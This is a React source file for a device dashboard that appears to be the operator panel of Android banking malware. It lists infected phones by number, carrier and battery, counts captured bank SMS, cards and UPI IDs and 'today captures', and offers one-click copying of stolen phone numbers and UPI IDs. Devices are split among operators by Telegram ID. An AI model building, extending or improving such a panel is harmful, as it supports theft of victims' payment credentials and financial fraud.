import { useEffect, useState, useMemo } from "react";
import { Link, useLocation } from "wouter";
import {
  Smartphone,
  Pin,
  PinOff,
  Activity,
  ChevronRight,
  Radio,
  Terminal,
  Gauge,
  Table2,
  LayoutGrid as GridIcon,
  CreditCard,
  IndianRupee,
  Signal,
  Copy,
} from "lucide-react";
import { Layout } from "@/components/layout";

import { useAuth } from "@/lib/auth";
import { useSearch } from "@/lib/search";
import {
  getBootstrap,
  setPin,
  isPlaceholderOwner,
  type PanelDevice,
} from "@/lib/api";
import { usePolling } from "@/lib/usePolling";
import { useCountUp } from "@/lib/useCountUp";
import { filterFleet, hasCards, getBatteryValue } from "@/lib/fleetFilter";
import type { NormalizedDevice } from "@/lib/normalizeDevice";

const API_BASE = (import.meta.env.VITE_API_URL ?? "").replace(/\/$/, "");

function HealthCell({
  label,
  value,
  icon: Icon,
  accent,
  glow,
  active,
  clickable,
  onSelect,
}: {
  label: string;
  value: number;
  icon: any;
  accent: string;
  glow: string;
  active: boolean;
  clickable: boolean;
  onSelect: () => void;
}) {
  const animated = useCountUp(value);
  const cls = `relative overflow-hidden rounded-2xl border bg-card/70 backdrop-blur p-3 flex items-center gap-3 transition-all focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring ${
    clickable ? "group cursor-pointer" : "group"
  } ${
    active
      ? "border-primary/60 ring-1 ring-primary/40"
      : clickable
        ? "border-card-border hover:border-primary/40"
        : "border-card-border"
  }`;
  const inner = (
    <>
      <div
        className={`absolute -top-10 -right-10 w-28 h-28 rounded-full bg-gradient-to-br ${accent} blur-2xl opacity-60 group-hover:opacity-100 transition-opacity`}
      />
      <div
        className={`relative flex items-center justify-center w-10 h-10 rounded-xl bg-gradient-to-br ${accent} shadow-lg ${glow}`}
      >
        <Icon className="w-5 h-5" />
      </div>
      <div className="relative flex flex-col leading-tight">
        <span className="page-eyebrow">{label}</span>
        <span
          className="font-mono text-2xl font-bold tracking-tight text-foreground tabular-nums"
          aria-live="polite"
        >
          {String(animated).padStart(2, "0")}
        </span>
      </div>
    </>
  );
  if (!clickable) return <div className={cls}>{inner}</div>;
  return (
    <div
      className={cls}
      role="button"
      tabIndex={0}
      title={`Filter: ${label}`}
      aria-pressed={active}
      onClick={onSelect}
      onKeyDown={(e) => {
        if (e.key === "Enter" || e.key === " ") {
          e.preventDefault();
          onSelect();
        }
      }}
    >
      {inner}
    </div>
  );
}

export function Dashboard() {
  const { isAdmin, userId } = useAuth();
  const [, setLocation] = useLocation();
  const { data: boot, loading } = usePolling(getBootstrap, 3000);
  const [devices, setDevices] = useState<NormalizedDevice[]>([]);
  const { query: search } = useSearch();
  const [pinnedIds, setPinnedIds] = useState<Set<string>>(new Set());
  const [messageIds, setMessageIds] = useState<Set<string>>(new Set());
  const [bankSmsCount, setBankSmsCount] = useState(0);
  const [view, setView] = useState<"grid" | "table">("grid");
  const [filter, setFilter] = useState<
    "all" | "online" | "offline" | "pinned" | "upi" | "cards" | "bank"
  >("all");
  const [sortMode, setSortMode] = useState<
    "newest" | "oldest" | "name" | "battery"
  >("newest");
  const [groupFilter, setGroupFilter] = useState("all");

  useEffect(() => {
    if (!boot) return;
    setDevices(boot.devices as unknown as NormalizedDevice[]);
    setPinnedIds(new Set(boot.pins));
    setMessageIds(new Set(boot.messageIds));
    setBankSmsCount(boot.bankSms);
  }, [boot]);

  const togglePin = async (deviceId: string, e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    if (!userId) return;
    const next = !pinnedIds.has(deviceId);
    setPinnedIds((prev) => {
      const cur = new Set(prev);
      if (next) cur.add(deviceId);
      else cur.delete(deviceId);
      return cur;
    });
    try {
      await setPin(deviceId, next);
    } catch {
      setPinnedIds((prev) => {
        const cur = new Set(prev);
        if (next) cur.delete(deviceId);
        else cur.add(deviceId);
        return cur;
      });
    }
  };

  const visibleDevices = useMemo(() => {
    const withMsgs = devices.filter((d) => messageIds.has(d.id));
    if (isAdmin) return withMsgs;
    // Placeholder/unowned devices are visible to everyone; owned ones only to
    // their owner (string-coerced — telegram ids arrive as strings).
    return withMsgs.filter(
      (d) =>
        isPlaceholderOwner(d.ownerTelegramId) ||
        String(d.ownerTelegramId) === String(userId)
    );
  }, [devices, isAdmin, userId, messageIds]);

  const filteredDevices = useMemo(
    () =>
      filterFleet({
        devices: visibleDevices,
        search,
        filter,
        group: groupFilter,
        pinnedIds,
        sortMode,
      }),
    [visibleDevices, search, pinnedIds, filter, sortMode, groupFilter]
  );

  // Fleet-health stats (from all devices visible to this user).
  const fleet = useMemo(() => {
    const online = visibleDevices.filter((d) => d.isOnline).length;
    const offline = visibleDevices.filter((d) => !d.isOnline).length;
    const cards = visibleDevices.filter(hasCards).length;
    const upi = visibleDevices.filter((d) => d.upi).length;
    const groups = [
      ...new Set(visibleDevices.map((d) => d.group).filter(Boolean)),
    ] as string[];
    const today = visibleDevices.filter((d) => {
      const cc =
        Number(new Date(String(d.raw.cc_timestamp || "")).getTime()) || 0;
      const upi =
        Number(new Date(String(d.raw.upi_timestamp || "")).getTime()) || 0;
      const ts = Math.max(cc, upi);
      if (!ts) return false;
      return new Date(ts).toDateString() === new Date().toDateString();
    }).length;
    return {
      total: visibleDevices.length,
      online,
      offline,
      cards,
      upi,
      bank: bankSmsCount,
      groups,
      today,
    };
  }, [visibleDevices, bankSmsCount]);

  const healthCells = [
    {
      label: "Total Devices",
      value: fleet.total,
      icon: Terminal,
      key: "all" as const,
      accent: "from-primary/25 to-primary/5 text-primary",
      glow: "shadow-primary/30",
    },
    {
      label: "Online",
      value: fleet.online,
      icon: Radio,
      key: "online" as const,
      accent: "from-success/25 to-success/5 text-success",
      glow: "shadow-success/30",
    },
    {
      label: "Offline",
      value: fleet.offline,
      icon: Gauge,
      key: "offline" as const,
      accent:
        "from-muted-foreground/20 to-muted-foreground/5 text-muted-foreground",
      glow: "shadow-black/20",
    },
    {
      label: "Bank SMS",
      value: fleet.bank,
      icon: IndianRupee,
      key: "bank" as const,
      accent: "from-warning/25 to-warning/5 text-warning",
      glow: "shadow-warning/30",
      statOnly: true,
    },
    {
      label: "Cards",
      value: fleet.cards,
      icon: CreditCard,
      key: "cards" as const,
      accent: "from-accent/25 to-accent/5 text-accent",
      glow: "shadow-accent/30",
    },
    {
      label: "UPI IDs",
      value: fleet.upi,
      icon: Signal,
      key: "upi" as const,
      accent: "from-primary/15 to-primary/5 text-primary",
      glow: "shadow-primary/20",
    },
    {
      label: "Today Captures",
      value: fleet.today,
      icon: Gauge,
      key: "today" as const,
      accent: "from-warning/25 to-warning/5 text-warning",
      glow: "shadow-warning/30",
    },
  ];

  const jumpToDevices = () => {
    document
      .getElementById("devices-tools")
      ?.scrollIntoView({ behavior: "smooth", block: "start" });
  };

  const batteryTone = (pct: number): "danger" | "warn" | "good" =>
    pct > 60 ? "good" : pct >= 20 ? "warn" : "danger";

  const RING_STROKE: Record<string, string> = {
    good: "stroke-success",
    warn: "stroke-warning",
    danger: "stroke-destructive",
  };

  const quickCopy = async (text: string, e: React.MouseEvent) => {
    e.preventDefault();
    e.stopPropagation();
    try {
      await navigator.clipboard.writeText(text);
    } catch {
      /* ignore */
    }
  };

  return (
    <Layout>
      {/* ── Page header ── */}
      <div className="relative overflow-hidden rounded-3xl border border-card-border bg-gradient-to-br from-primary/10 via-card/60 to-accent/10 p-5 md:p-6 mb-4">
        <div
          className="absolute inset-0 opacity-[0.14] pointer-events-none"
          style={{
            backgroundImage:
              "linear-gradient(to right, hsl(var(--border)) 1px, transparent 1px), linear-gradient(to bottom, hsl(var(--border)) 1px, transparent 1px)",
            backgroundSize: "36px 36px",
          }}
        />
        <div className="absolute -top-20 -left-20 w-64 h-64 rounded-full bg-primary/20 blur-3xl pointer-events-none" />
        <div className="absolute -bottom-24 -right-16 w-72 h-72 rounded-full bg-accent/15 blur-3xl pointer-events-none" />
        <div className="relative flex flex-col gap-4">
          <div>
            <p className="page-eyebrow flex items-center gap-2">
              <Activity className="w-3 h-3 text-primary" /> Your devices
            </p>
            <h1 className="page-title text-3xl md:text-4xl">
              <span className="text-primary">Devices</span>
            </h1>
            <p className="text-sm text-muted-foreground mt-1.5 flex items-center gap-2 flex-wrap">
              <span className="inline-flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-success animate-pulse shadow-[0_0_8px_2px] shadow-success/50" />
                {fleet.online} online right now
              </span>
              <span className="opacity-40">·</span>
              <span>{filteredDevices.length} shown</span>
              {pinnedIds.size > 0 && (
                <>
                  <span className="opacity-40">·</span>
                  <span className="text-primary">{pinnedIds.size} pinned</span>
                </>
              )}
            </p>
          </div>

          <div className="flex items-center gap-1.5 p-1 rounded-xl border border-card-border bg-card/70 backdrop-blur w-fit">
            <button
              onClick={() => setView("grid")}
              aria-label="Grid view"
              className={`flex items-center justify-center w-9 h-9 rounded-lg transition-all ${view === "grid" ? "bg-primary/15 text-primary" : "text-muted-foreground hover:text-foreground"}`}
            >
              <GridIcon className="w-4 h-4" />
            </button>
            <button
              onClick={() => setView("table")}
              aria-label="Table view"
              className={`flex items-center justify-center w-9 h-9 rounded-lg transition-all ${view === "table" ? "bg-primary/15 text-primary" : "text-muted-foreground hover:text-foreground"}`}
            >
              <Table2 className="w-4 h-4" />
            </button>
          </div>
        </div>
      </div>

      {/* ── Fleet-health instrument strip ── */}
      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 xl:grid-cols-7 gap-2.5 mb-4">
        {healthCells.map((c) => {
          const clickable = !c.statOnly && c.key !== "today";
          return (
            <HealthCell
              key={c.label}
              label={c.label}
              value={c.value}
              icon={c.icon}
              accent={c.accent}
              glow={c.glow}
              active={filter === c.key}
              clickable={clickable}
              onSelect={() => {
                if (c.key === "today") return;
                setFilter(c.key);
                jumpToDevices();
              }}
            />
          );
        })}
      </div>

      {/* ── Mythos-style filter chips + sort ── */}
      <div
        id="devices-tools"
        className="flex flex-wrap items-center gap-2 mb-4 md:sticky md:top-16 md:z-20 md:py-2 md:bg-background/80 md:backdrop-blur-md md:rounded-2xl scroll-mt-20"
      >
        <div className="flex flex-wrap gap-1.5 p-1 rounded-xl border border-card-border bg-card/70 backdrop-blur">
          {(
            [
              ["all", "All"],
              ["online", "Online"],
              ["offline", "Offline"],
              ["pinned", "Pinned"],
              ["upi", "UPI"],
              ["cards", "Cards"],
            ] as const
          ).map(([key, label]) => (
            <button
              key={key}
              onClick={() => setFilter(key)}
              className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                filter === key
                  ? "bg-primary text-primary-foreground shadow-md shadow-primary/25"
                  : "text-muted-foreground hover:text-foreground hover:bg-muted"
              }`}
            >
              {label}
            </button>
          ))}
        </div>
        {fleet.groups.length > 0 && (
          <select
            value={groupFilter}
            onChange={(e) => setGroupFilter(e.target.value)}
            className="h-9 px-3 rounded-xl border border-card-border bg-card/70 backdrop-blur text-xs font-semibold text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 cursor-pointer"
          >
            <option value="all">All Groups</option>
            {fleet.groups.map((g) => (
              <option key={g} value={g}>
                {g}
              </option>
            ))}
          </select>
        )}
        <select
          value={sortMode}
          onChange={(e) => setSortMode(e.target.value as any)}
          className="h-9 px-3 rounded-xl border border-card-border bg-card/70 backdrop-blur text-xs font-semibold text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 cursor-pointer"
        >
          <option value="newest">Newest</option>
          <option value="oldest">Oldest</option>
          <option value="name">Name</option>
          <option value="battery">Battery</option>
        </select>
      </div>

      {loading ? (
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
          {[1, 2, 3, 4, 5, 6, 7, 8].map((i) => (
            <div
              key={i}
              className="relative overflow-hidden rounded-2xl border border-card-border bg-card/60 h-52"
            >
              <div className="absolute inset-0 bg-gradient-to-r from-transparent via-primary/5 to-transparent animate-pulse" />
            </div>
          ))}
        </div>
      ) : filteredDevices.length === 0 ? (
        <div className="relative overflow-hidden rounded-2xl border border-dashed border-card-border flex flex-col items-center justify-center py-24 px-4 text-center bg-card/40">
          <div className="absolute -top-20 left-1/2 -translate-x-1/2 w-72 h-72 rounded-full bg-primary/10 blur-3xl" />
          <div className="relative w-16 h-16 rounded-2xl bg-gradient-to-br from-primary/20 to-accent/10 flex items-center justify-center mb-4 ring-1 ring-primary/20">
            <Smartphone className="w-8 h-8 text-primary" />
          </div>
          <h3 className="font-display text-lg font-semibold text-foreground mb-1">
            No devices found
          </h3>
          <p className="text-sm text-muted-foreground max-w-sm">
            {search
              ? "Adjust your search query to find active devices."
              : isAdmin
                ? "No devices yet — they'll show up here the moment one connects."
                : "No devices are assigned to your account yet. Contact admin."}
          </p>
        </div>
      ) : view === "table" ? (
        <div className="overflow-x-auto rounded-2xl border border-card-border bg-card/70 backdrop-blur">
          <table className="w-full min-w-[720px] text-sm">
            <thead>
              <tr className="border-b border-card-border text-left">
                <th className="page-eyebrow px-4 py-3">#</th>
                <th className="page-eyebrow px-4 py-3">Device</th>
                <th className="page-eyebrow px-4 py-3">Phone</th>
                <th className="page-eyebrow px-4 py-3">Network</th>
                <th className="page-eyebrow px-4 py-3">UPI / Android</th>
                <th className="page-eyebrow px-4 py-3">Battery</th>
                <th className="page-eyebrow px-4 py-3">Status</th>
                {isAdmin && <th className="page-eyebrow px-4 py-3">Owner</th>}
                <th className="px-4 py-3" />
              </tr>
            </thead>
            <tbody>
              {filteredDevices.map((device, i) => {
                const batteryNum = getBatteryValue(device.battery);
                const isPinned = pinnedIds.has(device.id);
                const online = device.isOnline;
                const tone = batteryTone(batteryNum);
                const segs = Math.max(1, Math.ceil(batteryNum / 20));
                const segClass =
                  tone === "danger" || tone === "warn"
                    ? "bg-warning"
                    : "bg-success";
                return (
                  <tr
                    key={device.id}
                    className={`border-b border-card-border last:border-0 hover:bg-muted/50 transition-colors cursor-pointer ${isPinned ? "bg-primary/5" : ""}`}
                    onClick={() => setLocation(`/device/${device.id}`)}
                  >
                    <td className="px-4 py-3 font-mono text-xs text-muted-foreground">
                      {isPinned ? "📌" : String(i + 1).padStart(2, "0")}
                    </td>
                    <td className="px-4 py-3">
                      <span className="font-display font-semibold flex items-center gap-1.5">
                        {device.deviceName || device.model}
                        {device.colorTag && (
                          <span
                            className="inline-block w-2 h-2 rounded-full"
                            style={{ background: device.colorTag }}
                          />
                        )}
                      </span>
                      {device.deviceName && (
                        <span className="block text-[10px] text-muted-foreground font-mono">
                          {device.model}
                        </span>
                      )}
                    </td>
                    <td className="px-4 py-3">
                      <span className="flex items-center gap-1.5 min-w-0 group/phone">
                        <span className="font-mono text-xs font-semibold truncate max-w-[7.5rem]">
                          {device.phone || "—"}
                        </span>
                        {device.phone && (
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              quickCopy(device.phone, e);
                            }}
                            title="Copy number"
                            className="opacity-0 group-hover/phone:opacity-100 transition-opacity text-muted-foreground hover:text-primary p-0.5"
                          >
                            <Copy className="w-3 h-3" />
                          </button>
                        )}
                      </span>
                    </td>
                    <td className="px-4 py-3">
                      <span className="inline-flex items-center gap-1 font-mono text-[10px] text-muted-foreground bg-muted/60 px-1.5 py-0.5 rounded-md border border-card-border max-w-[7rem] truncate">
                        <Signal className="w-2.5 h-2.5 text-primary/70 shrink-0" />
                        {device.raw.service_provider || "—"}
                      </span>
                    </td>
                    <td className="px-4 py-3">
                      <span className="flex items-center gap-1.5 min-w-0 group/upi">
                        <span className="font-mono text-xs truncate max-w-[7rem]">
                          {device.upi ? (
                            <span className="text-primary">{device.upi}</span>
                          ) : device.androidV ? (
                            `v${device.androidV}`
                          ) : (
                            "—"
                          )}
                        </span>
                        {device.upi && (
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              quickCopy(device.upi, e);
                            }}
                            title="Copy UPI"
                            className="opacity-0 group-hover/upi:opacity-100 transition-opacity text-muted-foreground hover:text-primary p-0.5"
                          >
                            <Copy className="w-3 h-3" />
                          </button>
                        )}
                      </span>
                    </td>
                    <td className="px-4 py-3">
                      <div className="flex items-center gap-2">
                        <div className="flex items-center gap-0.5 w-16">
                          {[0, 1, 2, 3, 4].map((x) => (
                            <span
                              key={x}
                              className={`h-1.5 rounded-sm flex-1 ${x < segs ? (online ? segClass + " animate-pulse" : segClass) : "bg-border"}`}
                              style={{ animationDelay: `${x * 120}ms` }}
                            />
                          ))}
                        </div>
                        <span
                          className={`font-mono text-[10px] font-bold ${batteryNum <= 20 ? "text-warning" : "text-muted-foreground"}`}
                        >
                          {device.battery || "—"}
                        </span>
                      </div>
                    </td>
                    <td className="px-4 py-3">
                      <span
                        className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-bold ${
                          online
                            ? "bg-success/10 text-success"
                            : "bg-muted/60 text-muted-foreground"
                        }`}
                      >
                        <span
                          className={`w-1.5 h-1.5 rounded-full ${online ? "bg-success animate-pulse" : "bg-muted-foreground"}`}
                        />
                        {online ? "Online" : "Offline"}
                      </span>
                    </td>
                    {isAdmin && (
                      <td className="px-4 py-3 font-mono text-[10px] text-muted-foreground">
                        {device.ownerTelegramId
                          ? device.ownerTelegramId.slice(0, 8) + "…"
                          : "—"}
                      </td>
                    )}
                    <td className="px-4 py-3 text-right">
                      <ChevronRight className="w-4 h-4 text-muted-foreground inline" />
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 animate-in fade-in slide-in-from-bottom-4 duration-200 ease-out fill-mode-both">
          {filteredDevices.map((device) => {
            const batteryNum = getBatteryValue(device.battery);
            const isPinned = pinnedIds.has(device.id);
            const online = device.isOnline;
            const tone = batteryTone(batteryNum);

            return (
              <Link
                key={device.id}
                href={`/device/${device.id}`}
                className={`group relative overflow-hidden rounded-2xl border bg-card/70 backdrop-blur p-4 flex flex-col gap-3 card-lift ${
                  isPinned
                    ? "border-accent/50 shadow-lg shadow-accent/10"
                    : "border-card-border hover:border-accent/50"
                }`}
              >
                {/* Header: model bold left + ring + pill right */}
                <div className="flex items-center justify-between gap-2">
                  <div className="min-w-0">
                    <h3
                      className="font-display font-semibold text-sm truncate group-hover:text-accent transition-colors"
                      title={device.model}
                    >
                      {device.deviceName || device.model}
                      {device.colorTag && (
                        <span
                          className="inline-block w-2 h-2 rounded-full ml-1.5 align-middle"
                          style={{ background: device.colorTag }}
                        />
                      )}
                    </h3>
                  </div>
                  <div className="flex items-center gap-2 shrink-0">
                    {device.battery && (
                      <div
                        className="relative w-10 h-10"
                        title={`Battery ${device.battery}`}
                      >
                        <svg
                          viewBox="0 0 36 36"
                          className="w-10 h-10 -rotate-90"
                        >
                          <circle
                            cx="18"
                            cy="18"
                            r="15.5"
                            fill="none"
                            strokeWidth="3.5"
                            className="stroke-border"
                          />
                          <circle
                            cx="18"
                            cy="18"
                            r="15.5"
                            fill="none"
                            strokeWidth="3.5"
                            strokeLinecap="round"
                            strokeDasharray={`${2 * Math.PI * 15.5}`}
                            strokeDashoffset={`${2 * Math.PI * 15.5 * (1 - Math.min(100, Math.max(0, batteryNum)) / 100)}`}
                            className={`${RING_STROKE[tone]} transition-[stroke-dashoffset] duration-500 ease-out`}
                          />
                        </svg>
                        <span className="absolute inset-0 flex items-center justify-center font-mono text-[9px] font-bold">
                          {batteryNum}%
                        </span>
                      </div>
                    )}
                    <span
                      className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-[11px] font-bold tracking-wide ${
                        online
                          ? "bg-success/10 text-success border border-success/20 shadow-[0_0_12px_-2px] shadow-success/40"
                          : "bg-muted/60 text-muted-foreground border border-card-border"
                      }`}
                    >
                      <span
                        className={`w-1.5 h-1.5 rounded-full ${online ? "bg-success animate-pulse" : "bg-muted-foreground"}`}
                      />
                      {online ? "ONLINE" : "OFFLINE"}
                    </span>
                  </div>
                </div>

                {/* Two-column details: number+network | android+storage */}
                <div className="grid grid-cols-2 gap-x-4 gap-y-2 text-xs">
                  <div className="flex flex-col min-w-0">
                    <span className="page-eyebrow">Number</span>
                    <span className="font-mono font-semibold truncate">
                      {device.phone || "—"}
                    </span>
                  </div>
                  <div className="flex flex-col min-w-0">
                    <span className="page-eyebrow">Network</span>
                    <span className="font-mono text-muted-foreground truncate">
                      {device.raw.service_provider || "—"}
                    </span>
                  </div>
                  <div className="flex flex-col min-w-0">
                    <span className="page-eyebrow">Android</span>
                    <span className="font-mono truncate">
                      {device.androidV ? `v${device.androidV}` : "—"}
                    </span>
                  </div>
                  <div className="flex flex-col min-w-0">
                    <span className="page-eyebrow">Storage</span>
                    <span className="font-mono text-muted-foreground truncate">
                      {device.storage || "—"}
                    </span>
                  </div>
                </div>
              </Link>
            );
          })}
        </div>
      )}
    </Layout>
  );
}
